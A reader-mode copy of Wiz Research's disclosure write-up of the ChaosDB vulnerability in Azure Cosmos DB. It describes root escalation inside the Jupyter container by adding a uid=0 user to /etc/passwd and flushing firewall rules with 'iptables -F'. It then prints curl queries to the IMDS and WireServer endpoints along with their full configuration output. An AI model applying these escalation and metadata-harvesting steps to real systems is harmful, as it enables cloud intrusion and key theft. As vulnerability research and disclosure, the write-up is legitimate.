<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability-walkthrough">Original</a>
    
    <div id="readability-page-1" class="page"><div><div><p>This is the full story of the Azure <a href="https://www.wiz.io/blog/chaosdb-how-we-hacked-thousands-of-azure-customers-databases" target="_blank">ChaosDB Vulnerability</a> that was discovered and disclosed by the Wiz Research Team, where we were able to gain complete unrestricted access to the databases of several thousand Microsoft Azure customers. In August 2021, we disclosed to Microsoft a new vulnerability in Cosmos DB that ultimately allowed us to retrieve numerous internal keys that can be used to manage the service, following this high-level workflow:  </p><p>1. Set up a Jupyter Notebook container on your Azure Cosmos DB</p><p>In this post we walk you through every step of the way, to the point where we even gained administrative access to some of the magic that powers Azure.</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b4ed295cb0bc_ChaosDB-BH-Gif-.gif" loading="lazy" alt=""/></p></figure><p>‍</p><h4>Uncovering the basics</h4><p><strong>What is Azure Cosmos DB? </strong></p><p>According to <a href="https://docs.microsoft.com/en-us/azure/cosmos-db/introduction" target="_blank">Microsoft</a>: </p><blockquote>Azure Cosmos DB is a fully managed NoSQL database for modern app development. Single-digit millisecond response times, with automatic and instant scalability, guarantee speed at any scale. Business continuity is assured with SLA-backed availability and enterprise-grade security. </blockquote><p>Launched in May 2017, Cosmos DB is a globally distributed database solution used by high-profile customers, including many Fortune500 companies (according to <a href="https://gotcosmos.com/" target="_blank">gotocosmos.com</a>).</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b4687d5cb0a3_image1.png" loading="lazy" alt=""/></p></figure><p>Cosmos DB can be accessed via API keys for reading, writing, and deleting operations, and its permissions can be managed by standard Azure IAM. To perform any operation on a Cosmos DB instance, you simply need to supply the Cosmos DB endpoint and an appropriate API key (<em>Primary Key</em>). The Primary Key for a Cosmos DB Account is the equivalent of the root password in traditional, on-premises databases.</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b4e3515cb0a4_image2.png" loading="lazy" alt=""/></p><figcaption>Cosmos DB access keys and connection URI</figcaption></figure><p><strong>What is Jupyter Notebook? </strong></p><p>The Azure Cosmos DB instances (used to) come with an embedded Jupyter Notebook container, an open-source web application that allows you to create and share documents that contain live code, equations, visualizations, and narrative text (read more about it <a href="https://jupyter.org/" target="_blank">here</a>). Basically, it is a very cool way to represent data using code.</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b479515cb0a8_image3.png" loading="lazy" alt=""/></p><figcaption>Cosmos DB Jupyter Notebook, taken from <a href="https://docs.microsoft.com/en-us/azure/cosmos-db/cosmosdb-jupyter-notebooks" target="_blank">Microsoft official documentation</a></figcaption></figure><p>The Jupyter Notebook Container offers terminal access as well as the option to interact with your Cosmos DB instance using different programming languages (Python, C#, etc). The credentials to the Cosmos DB Account are pre-configured in the environment variables of the container image, to use and access via the <a href="https://docs.microsoft.com/en-us/azure/cosmos-db/sql/sql-api-sdk-python" target="_blank">SDK </a>transparently.  </p><h4>Bug #1: Jupyter Notebook Local Privilege Escalation (LPE)</h4><p><strong>We knew that, by design, you could execute arbitrary code on Jupyter Notebook. A few minutes later, we had already gained root privileges. How? </strong> </p><p><a href="https://ctt.ac/Jo4VR" target="_blank">Click to tweet this!</a> </p><p>When we used the embedded Jupyter terminal or the default Python3 Notebook, our code was being executed as the unprivileged, non-sudo&#39;er user named <em>cosmosuser</em>. It seems that the service developers’ intention was that any code executed in this interface would be executed as <em>cosmosuser</em>.</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b441b85cb0a9_image4.png" loading="lazy" alt=""/></p><figcaption>Python3 notebook running as cosmosuser</figcaption></figure><p>However, when we executed some C# code, we noticed it was being executed with root privileges.  </p><p>Yes, we were surprised as well.  </p><p>It seems that every programming language the Jupyter Notebook supports has its own “host” process responsible for executing user-supplied code, and communicating the output to the Web-UI. For some unknown reason, the host process for C# specifically was running with root privileges, which meant that any C# code would be executed as root as well. We used this misconfiguration to escalate our privileges inside the container: we appended a line to the <em>/etc/passwd</em> file, created a new user with <em>uid=0</em> and <em>gid=0</em>, switched to this user using the <em>su</em> command, and were effectively granted root privileges inside the container. And if you are asking yourself why we wanted to obtain root privileges in the first place, the answer is very simple – we were curious about this environment: who owns it? Is it shared across users? We assumed, that as root, we may be able to answer some of our unanswered questions. </p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b40b3f5cb0aa_image5.png" loading="lazy" alt=""/></p><figcaption>Executing <a href="https://127.0.0.1/" target="_blank">privilege escalation payload</a> using the CSharp notebook</figcaption></figure><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b43c045cb0ab_image6.png" loading="lazy" alt=""/></p><figcaption>/etc/passwd after executing the privilege escalation payload</figcaption></figure><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b4452a5cb0ac_image7.png" loading="lazy" alt=""/></p><figcaption>Switching users to the added backdoor user</figcaption></figure><h4>Bug #2: Unrestricted Network Access  </h4><p><strong><em>iptables –F </em> was all it took.  </strong></p><p>After gaining root privileges we started poking around the container, and amongst other things, we issued the <em>iptables</em> command to view the local firewall rules determining which network resources we could, and more interestingly, could not, access.</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b4d1a95cb0ad_image8.png" loading="lazy" alt=""/></p><figcaption>Examining iptables rules as root</figcaption></figure><p>Looking at the <em>iptables</em> rules, we found these supposedly forbidden addresses:  </p><p>1. <em>169.254.169.254 </em>, the <a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux" target="_blank">IMDS Metadata Service</a>  </p><p><strong>Why did the service developers configure these specific rules to prevent us from accessing these specific IP addresses?</strong> Good thing (or bad, depending whose side you are on) these firewall rules were configured locally on the container where we were currently running as root. So, we simply deleted the rules (by issuing <em>iptables -F</em>), clearing the way to these forbidden IP addresses and to some even more interesting findings.  </p><p>It is important to point out that, in our opinion, a safer approach to enforce these firewall rules is outside the Jupyter Notebook container, where a hacker cannot bypass them even with root privileges.  </p><h4>Bug #3: Not the Certificate We Deserve, but the Certificate We Need  </h4><p>After the jailbreak that we achieved with the two previous bugs (Jupyter Notebook LPE and Unrestricted Network Access), we conducted some network recon that involved accessing the previously forbidden IP addresses. The way we saw it was that if the developers went through the trouble of explicitly attempting to prevent us from accessing these addresses, then we should most definitely go through the trouble of attempting to access them.  </p><p><strong>Accessing forbidden IP address #1 – IMDS</strong></p><p><em>169.254.169.254</em> is the Azure <a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux" target="_blank">Metadata Service</a> (IMDS). This service holds metadata about the currently running virtual machine instance, such as storage, network configuration <a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux#endpoint-categories" target="_blank">and more</a>. You simply send an HTTP request and retrieve unique information per Virtual Machine (VM). We issued a request, and discovered a couple of interesting things:   </p><p>1. Our Azure environment was set to AzurePublicCloud, and our subscription ID was not a subscription that we owned.  </p><p>Putting these together, we realized we were not querying the Metadata Service of our container, but that of our HOST MACHINE, which seems to be hosted in some sort of a <strong>shared environment</strong>!</p><p>
-- CODE language-bash line-numbers --
root@notebook:/home/cosmosuser# curl -s -H Metadata:true --noproxy &#34;*&#34; &#34;http://169.254.169.254/metadata/instance?api-version=2021-02-01&#34; | jq 
 { 
  &#34;compute&#34;: { 
    &#34;azEnvironment&#34;: &#34;AzurePublicCloud&#34;, 
    &#34;customData&#34;: &#34;&#34;, 
    &#34;evictionPolicy&#34;: &#34;&#34;, 
    &#34;isHostCompatibilityLayerVm&#34;: &#34;false&#34;, 
    &#34;licenseType&#34;: &#34;&#34;, 
    &#34;location&#34;: &#34;eastus&#34;, 
    &#34;name&#34;: &#34;CV2CW02_3&#34;, 
    &#34;offer&#34;: &#34;WindowsServer&#34;, 
    &#34;osProfile&#34;: { 
      &#34;adminUsername&#34;: &#34;cosmosadmin&#34;, 
      &#34;computerName&#34;: &#34;CV2CW02000003&#34;, 
      &#34;disablePasswordAuthentication&#34;: &#34;&#34; 
    }, 
    &#34;osType&#34;: &#34;Windows&#34;, 
    &#34;placementGroupId&#34;: &#34;[REDACTED]&#34;, 
    &#34;plan&#34;: { 
      &#34;name&#34;: &#34;&#34;, 
      &#34;product&#34;: &#34;&#34;, 
      &#34;publisher&#34;: &#34;&#34; 
    }, 
    &#34;platformFaultDomain&#34;: &#34;3&#34;, 
    &#34;platformUpdateDomain&#34;: &#34;3&#34;, 
    &#34;priority&#34;: &#34;&#34;, 
    &#34;provider&#34;: &#34;Microsoft.Compute&#34;, 
    &#34;publicKeys&#34;: [], 
    &#34;publisher&#34;: &#34;MicrosoftWindowsServer&#34;, 
    &#34;resourceGroupName&#34;: &#34;eastus-cdb-ms-prod-eastus1-cs1&#34;, 
    &#34;resourceId&#34;: &#34;/subscriptions/[REDACTED]/resourceGroups/eastus-cdb-ms-prod-eastus1-cs1/providers/Microsoft.Compute/virtualMachineScaleSets/CV2CW02/virtualMachines/3&#34;, 
    &#34;securityProfile&#34;: { 
      &#34;secureBootEnabled&#34;: &#34;false&#34;, 
      &#34;virtualTpmEnabled&#34;: &#34;false&#34; 
    }, 
    &#34;sku&#34;: &#34;datacenter-core-2004-with-containers-smalldisk&#34;, 
    &#34;storageProfile&#34;: { 
      &#34;dataDisks&#34;: [ 
        { 
          &#34;caching&#34;: &#34;None&#34;, 
          &#34;createOption&#34;: &#34;Empty&#34;, 
          &#34;diskSizeGB&#34;: &#34;128&#34;, 
          &#34;image&#34;: { 
            &#34;uri&#34;: &#34;&#34; 
          }, 
          &#34;lun&#34;: &#34;0&#34;, 
          &#34;managedDisk&#34;: { 
            &#34;id&#34;: &#34;/subscriptions/[REDACTED]/resourceGroups/EASTUS-CDB-MS-PROD-EASTUS1-CS1/providers/Microsoft.Compute/disks/CV2CW02_CV2CW02_3_disk2_[REDACTED]&#34;, 
            &#34;storageAccountType&#34;: &#34;Premium_LRS&#34; 
          }, 
          &#34;name&#34;: &#34;CV2CW02_CV2CW02_3_disk2_[REDACTED]&#34;, 
          &#34;vhd&#34;: { 
            &#34;uri&#34;: &#34;&#34; 
          }, 
          &#34;writeAcceleratorEnabled&#34;: &#34;false&#34; 
        } 
      ], 
      &#34;imageReference&#34;: { 
        &#34;id&#34;: &#34;&#34;, 
        &#34;offer&#34;: &#34;WindowsServer&#34;, 
        &#34;publisher&#34;: &#34;MicrosoftWindowsServer&#34;, 
        &#34;sku&#34;: &#34;datacenter-core-2004-with-containers-smalldisk&#34;, 
        &#34;version&#34;: &#34;19041.985.2105050408&#34; 
      }, 
      &#34;osDisk&#34;: { 
        &#34;caching&#34;: &#34;ReadOnly&#34;, 
        &#34;createOption&#34;: &#34;FromImage&#34;, 
        &#34;diffDiskSettings&#34;: { 
          &#34;option&#34;: &#34;&#34; 
        }, 
        &#34;diskSizeGB&#34;: &#34;30&#34;, 
        &#34;encryptionSettings&#34;: { 
          &#34;enabled&#34;: &#34;false&#34; 
        }, 
        &#34;image&#34;: { 
          &#34;uri&#34;: &#34;&#34; 
        }, 
        &#34;managedDisk&#34;: { 
          &#34;id&#34;: &#34;/subscriptions/[REDACTED]/resourceGroups/eastus-cdb-ms-prod-eastus1-cs1/providers/Microsoft.Compute/disks/CV2CW02_CV2CW02_3_OsDisk_1_[REDACTED]&#34;, 
          &#34;storageAccountType&#34;: &#34;Premium_LRS&#34; 
        }, 
        &#34;name&#34;: &#34;CV2CW02_CV2CW02_3_OsDisk_1_[REDACTED]&#34;, 
        &#34;osType&#34;: &#34;Windows&#34;, 
        &#34;vhd&#34;: { 
          &#34;uri&#34;: &#34;&#34; 
        }, 
        &#34;writeAcceleratorEnabled&#34;: &#34;false&#34; 
      }, 
      &#34;resourceDisk&#34;: { 
        &#34;size&#34;: &#34;4096000&#34; 
      } 
    }, 
    &#34;subscriptionId&#34;: &#34;[REDACTED]&#34;, 
    &#34;tags&#34;: &#34;federationName:cdb-ms-prod-eastus1-cs1;platformsettings.host_environment.service.platform_optedin_for_rootcerts:true&#34;, 
    &#34;tagsList&#34;: [ 
      { 
        &#34;name&#34;: &#34;federationName&#34;, 
        &#34;value&#34;: &#34;cdb-ms-prod-eastus1-cs1&#34; 
      }, 
      { 
        &#34;name&#34;: &#34;platformsettings.host_environment.service.platform_optedin_for_rootcerts&#34;, 
        &#34;value&#34;: &#34;true&#34; 
      } 
    ], 
    &#34;userData&#34;: &#34;&#34;, 
    &#34;version&#34;: &#34;19041.985.2105050408&#34;, 
    &#34;vmId&#34;: &#34;[REDACTED]&#34;, 
    &#34;vmScaleSetName&#34;: &#34;CV2CW02&#34;, 
    &#34;vmSize&#34;: &#34;SQLG5_NP80s&#34;, 
    &#34;zone&#34;: &#34;&#34; 
  }, 
  &#34;network&#34;: { 
    &#34;interface&#34;: [ 
      { 
        &#34;ipv4&#34;: { 
          &#34;ipAddress&#34;: [ 
            { 
              &#34;privateIpAddress&#34;: &#34;10.0.1.60&#34;, 
              &#34;publicIpAddress&#34;: &#34;&#34; 
            } 
          ], 
          &#34;subnet&#34;: [ 
            { 
              &#34;address&#34;: &#34;10.0.1.0&#34;, 
              &#34;prefix&#34;: &#34;24&#34; 
            } 
          ] 
        }, 
        &#34;ipv6&#34;: { 
          &#34;ipAddress&#34;: [] 
        }, 
        &#34;macAddress&#34;: &#34;[REDACTED]&#34; 
      } 
    ] 
  } 

</p><p>Accessing forbidden IP address #3 – WireServer</p><p>After Googling IP address <em>168.63.129.16</em>, we discovered that it is a virtual IP address that exists on every Azure VM, and is referred to as the <a href="https://docs.microsoft.com/en-us/azure/virtual-network/what-is-ip-address-168-63-129-16" target="_blank">WireServer</a>:</p><figure><p><img src="https://assets-global.website-files.com/618c4feaba62b4d2da5cade6/618c4feaba62b47fd65cb0ae_image9.png" loading="lazy" alt=""/></p><figcaption>The WireServer MSDN documentation</figcaption></figure><p>Microsoft offers almost no official documentation for WireServer. However, <a href="https://twitter.com/polarply" target="_blank">Paul Litvak</a> from Intezer did an amazing job researching it! Check out his <a href="https://www.intezer.com/blog/cloud-security/cve-2021-27075-microsoft-azure-vulnerability-allows-privilege-escalation-and-leak-of-data/" target="_blank">blog post</a> regarding past vulnerabilities involving Azure WireServer. </p><p>We learned that WireServer manages aspects and features of VMs within Azure, and specifically the <a href="https://docs.microsoft.com/en-us/azure/virtual-machines/extensions/overview" target="_blank">extensions</a> of every Azure VM. Extensions are software applications that Azure manages, either first-party software like Azure’s log analytics agent, or third-party software that Azure supports like Datadog. Apparently, in order to install and configure these extensions, all Azure VMs come pre-installed with one of two agents, one for Windows and one for Linux. You can think of WireServer as the backend of these agents, used to supply any information the agent needs in order to function properly. </p><p>Going back to the WireServer agent for Linux, also known as the WA-Agent or the WA-Linux-Agent, we realized it was an open-source project <a href="https://github.com/Azure/WALinuxAgent" target="_blank">hosted on GitHub</a>. So we delved into the source code to learn more about WireServer functionalities. </p><p><strong>Understanding WireServer</strong></p><p>WireServer can be queried using HTTP and has several endpoints that are interesting for our research purposes:  </p><p>1. <em>Goal State</em>–Essentially, a phone book of endpoints that the agent needs to query in order to fetch different configuration settings. You can download any Azure VM Goal State to retrieve all configuration endpoints specific for your virtual machine by executing a simple <em>cURL</em> command, as can be seen in the snippet below. </p><p>To obtain information about our machine’s extensions, we first executed a cURL command to fetch the machine’s Goal State. The result was the underlying virtual machine Goal State, including its ExtensionsConfig URL, which we then also queried:  </p><p><strong>Querying the Goal State</strong></p><p>
-- CODE language-bash line-numbers --
root@notebook:/home/cosmosuser# curl -s &#34;http://168.63.129.16:80/machine/?comp=goalstate&#34; -H &#34;x-ms-agent-name: WALinuxAgent&#34; -H &#34;x-ms-version: 2012-11-30&#34; 
&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;GoalState xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xsi:noNamespaceSchemaLocation=&#34;goalstate10.xsd&#34;&gt; 
  &lt;Version&gt;2012-11-30&lt;/Version&gt; 
  &lt;Incarnation&gt;19&lt;/Incarnation&gt; 
  &lt;Machine&gt; 
    &lt;ExpectedState&gt;Started&lt;/ExpectedState&gt; 
    &lt;StopRolesDeadlineHint&gt;300000&lt;/StopRolesDeadlineHint&gt; 
    &lt;LBProbePorts&gt; 
      &lt;Port&gt;16001&lt;/Port&gt; 
    &lt;/LBProbePorts&gt; 
    &lt;ExpectHealthReport&gt;FALSE&lt;/ExpectHealthReport&gt; 
  &lt;/Machine&gt; 
  &lt;Container&gt; 
    &lt;ContainerId&gt;82daf2f0-1c7a-45e5-9be6-&lt;REDACTED&gt;&lt;/ContainerId&gt; 
    &lt;RoleInstanceList&gt; 
      &lt;RoleInstance&gt; 
        &lt;InstanceId&gt;f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;._CV2FI02_0&lt;/InstanceId&gt; 
        &lt;State&gt;Started&lt;/State&gt; 
        &lt;Configuration&gt; 
          &lt;HostingEnvironmentConfig&gt;http://168.63.129.16:80/machine/82daf2f0-1c7a-45e5-9be6-&lt;REDACTED&gt;/f2a6f11f%2Dad20%2D4bb3%2D839f%&lt;REDACTED&gt;.%5FCV2FI02%5F0?comp=config&amp;amp;type=hostingEnvironmentConfig&amp;amp;incarnation=19&lt;/HostingEnvironmentConfig&gt; 
          &lt;SharedConfig&gt;http://168.63.129.16:80/machine/82daf2f0-1c7a-45e5-9be6-&lt;REDACTED&gt;/f2a6f11f%2Dad20%2D4bb3%2D839f%&lt;REDACTED&gt;.%5FCV2FI02%5F0?comp=config&amp;amp;type=sharedConfig&amp;amp;incarnation=19&lt;/SharedConfig&gt; 
          &lt;ExtensionsConfig&gt;http://168.63.129.16:80/machine/82daf2f0-1c7a-45e5-9be6-&lt;REDACTED&gt;/f2a6f11f%2Dad20%2D4bb3%2D839f%&lt;REDACTED&gt;.%5FCV2FI02%5F0?comp=config&amp;amp;type=extensionsConfig&amp;amp;incarnation=19&lt;/ExtensionsConfig&gt; 
          &lt;FullConfig&gt;http://168.63.129.16:80/machine/82daf2f0-1c7a-45e5-9be6-&lt;REDACTED&gt;/f2a6f11f%2Dad20%2D4bb3%2D839f%&lt;REDACTED&gt;.%5FCV2FI02%5F0?comp=config&amp;amp;type=fullConfig&amp;amp;incarnation=19&lt;/FullConfig&gt; 
          &lt;Certificates&gt;http://168.63.129.16:80/machine/82daf2f0-1c7a-45e5-9be6-&lt;REDACTED&gt;/f2a6f11f%2Dad20%2D4bb3%2D839f%&lt;REDACTED&gt;.%5FCV2FI02%5F0?comp=certificates&amp;amp;incarnation=19&lt;/Certificates&gt; 
          &lt;ConfigName&gt;f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;.20.f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;.20._CV2FI02_0.1.xml&lt;/ConfigName&gt; 
        &lt;/Configuration&gt; 
        &lt;ServiceManagementInfo&gt; 
          &lt;SupportedVersions&gt;http://168.63.129.16:80/ServiceManagement/?comp=versions&lt;/SupportedVersions&gt; 
          &lt;ManagementInfo&gt;http://168.63.129.16:80/ServiceManagement/82daf2f0-1c7a-45e5-9be6-&lt;REDACTED&gt;/f2a6f11f%2Dad20%2D4bb3%2D839f%&lt;REDACTED&gt;.%5FCV2FI02%5F0?comp=ManagementInfo&lt;/ManagementInfo&gt; 
        &lt;/ServiceManagementInfo&gt; 
      &lt;/RoleInstance&gt; 
    &lt;/RoleInstanceList&gt; 
  &lt;/Container&gt; 
</p><p><strong>Retrieving ExtensionConfig</strong></p><p>
-- CODE language-bash line-numbers --
root@notebook:/home/cosmosuser# curl -s &#34;http://168.63.129.16:80/machine/82daf2f0-1c7a-45e5-9be6-&lt;REDACTED&gt;/f2a6f11f-ad20-4bb3-839f-&lt;REDACTED&gt;._CV2FI02_0?comp=config&amp;type=extensionsConfig&amp;incarnation=19&#34; -H &#34;x-ms-agent-name: WALinuxAgent&#34; -H &#34;x-ms-version: 2012-11-30&#34; 
&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;Extensions version=&#34;1.0.0.0&#34; goalStateIncarnation=&#34;19&#34;&gt;&lt;GuestAgentExtension xmlns:i=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;&gt; 
  &lt;GAFamilies&gt; 
    &lt;GAFamily&gt; 
      &lt;Name&gt;Win7&lt;/Name&gt;  
    &lt;/GAFamily&gt; 
    &lt;GAFamily&gt; 
      &lt;Name&gt;Win8&lt;/Name&gt; 
      &lt;Uris&gt;        &lt;Uri&gt;https://zrd&lt;REDACTED&gt;02.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://zrd&lt;REDACTED&gt;07.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://zrd&lt;REDACTED&gt;r01a.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://rd&lt;REDACTED&gt;03.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://zrd&lt;REDACTED&gt;r10a.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://zrd&lt;REDACTED&gt;r05a.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://rd&lt;REDACTED&gt;01.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://rd&lt;REDACTED&gt;01.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://zrd&lt;REDACTED&gt;05.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://rd&lt;REDACTED&gt;01.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://brd&lt;REDACTED&gt;04.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://zrd&lt;REDACTED&gt;r09a.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://zrd&lt;REDACTED&gt;03.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://rd&lt;REDACTED&gt;02.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://zrd&lt;REDACTED&gt;09.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://rd&lt;REDACTED&gt;02.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://zrd&lt;REDACTED&gt;r03a.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt;        &lt;Uri&gt;https://rd&lt;REDACTED&gt;02.blob.core.windows.net/bfd5c281a7dc4&lt;REDACTED&gt;/Microsoft.WindowsAzure.GuestAgent_CRPProd_uswest_manifest.xml&lt;/Uri&gt; 
      &lt;/Uris&gt; 
    &lt;/GAFamily&gt; 
  &lt;/GAFamilies&gt; 
  &lt;Location&gt;westus&lt;/Location&gt; 
  &lt;ServiceName&gt;CRP&lt;/ServiceName&gt; 
&lt;/GuestAgentExtension&gt; 
&lt;StatusUploadBlob statusBlobType=&#34;PageBlob&#34;&gt;https://md-&lt;REDACTED&gt;.z13.blob.storage.azure.net/$system/CV2FI02_0.6eb0b152-261a-4bc7-89ae-&lt;REDACTED&gt;.status?sv=2018-03-28&amp;amp;sr=b&amp;amp;sk=system-1&amp;amp;sig=MxCWbN&lt;REDACTED&gt;&amp;amp;se=9999-01-01T00%3a00%3a00Z&amp;amp;sp=w&lt;/StatusUploadBlob&gt; 
&lt;Plugins&gt; 
  &lt;Plugin name=&#34;Microsoft.Azure.Security.Dsms.DsmsForWindows&#34; version=&#34;3.20.60.1&#34; location=&#34;https://rd&lt;REDACTED&gt;02.blob.core.windows.net/&lt;REDACTED&gt;/Microsoft.Azure.Security.Dsms_DSMSForWindows_uswest_manifest.xml&#34; state=&#34;enabled&#34; autoUpgrade=&#34;true&#34; failoverlocation=&#34;https://brd&lt;REDACTED&gt;04.blob.core.windows.net/&lt;REDACTED&gt;/Microsoft.Azure.Security.Dsms_DSMSForWindows_uswest_manifest.xml&#34; runAsStartupTask=&#34;false&#34; isJson=&#34;true&#34; useExactVersion=&#34;true&#34; /&gt; 
  &lt;Plugin name=&#34;Microsoft.Azure.ServiceFabric.ServiceFabricNode&#34; version=&#34;1.1.0.12&#34; location=&#34;https://zrd&lt;REDACTED&gt;07.blob.core.windows.net/&lt;REDACTED&gt;/Microsoft.Azure.ServiceFabric_ServiceFabricNode_uswest_manifest.xml&#34; state=&#34;enabled&#34; autoUpgrade=&#34;true&#34; failoverlocation=&#34;https://rd&lt;REDACTED&gt;02.blob.core.windows.net/&lt;REDACTED&gt;/Microsoft.Azure.ServiceFabric_ServiceFabricNode_uswest_manifest.xml&#34; runAsStartupTask=&#34;false&#34; isJson=&#34;true&#34; useExactVersion=&#34;true&#34; /&gt; 
&lt;/Plugins&gt; 
&lt;PluginSettings&gt; 
  &lt;Plugin name=&#34;Microsoft.Azure.Security.Dsms.DsmsForWindows&#34; version=&#34;3.20.60.1&#34;&gt; 
    &lt;RuntimeSettings seqNo=&#34;2&#34;&gt;{ 
  &#34;runtimeSettings&#34;: [ 
    { 
      &#34;handlerSettings&#34;: { 
        &#34;protectedSettingsCertThumbprint&#34;: &#34;85FFC66A525E9A3D45597788B076B95356296E46&#34;, 
        &#34;protectedSettings&#34;: &#34;MIIB0AYJK&lt;REDACTED&gt;&#34; 
      } 
    } 
  ] 
}&lt;/RuntimeSettings&gt; 
  &lt;/Plugin&gt; 
  &lt;Plugin name=&#34;Microsoft.Compute.CustomScriptExtension&#34; version=&#34;1.10.12&#34;&gt; 
    &lt;DependsOn dependencyLevel=&#34;1&#34;&gt; 
      &lt;DependsOnExtension handler=&#34;Microsoft.Azure.Security.Dsms.DsmsForWindows&#34; /&gt; 
    &lt;/DependsOn&gt; 
  &lt;/Plugin&gt; 
  &lt;Plugin name=&#34;Microsoft.Azure.Geneva.GenevaMonitoring&#34; version=&#34;2.27.0.3&#34;&gt; 
    &lt;RuntimeSettings seqNo=&#34;2&#34;&gt;{ 
  &#34;runtimeSettings&#34;: [ 
    { 
      &#34;handlerSettings&#34;: { 
        &#34;publicSettings&#34;: {} 
      } 
    } 
  ] 
}&lt;/RuntimeSettings&gt; 
  &lt;/Plugin&gt; 
  &lt;Plugin name=&#34;Microsoft.Azure.Security.AntimalwareSignature.AntimalwareConfiguration&#34; version=&#34;2.58.15&#34;&gt; 
    &lt;RuntimeSettings seqNo=&#34;2&#34;&gt;{ 
  &#34;runtimeSettings&#34;: [ 
    { 
      &#34;handlerSettings&#34;: { 
        &#34;publicSettings&#34;: {} 
      } 
    } 
  ] 
}&lt;/RuntimeSettings&gt; 
  &lt;/Plugin&gt; 
&lt;/PluginSettings&gt; 
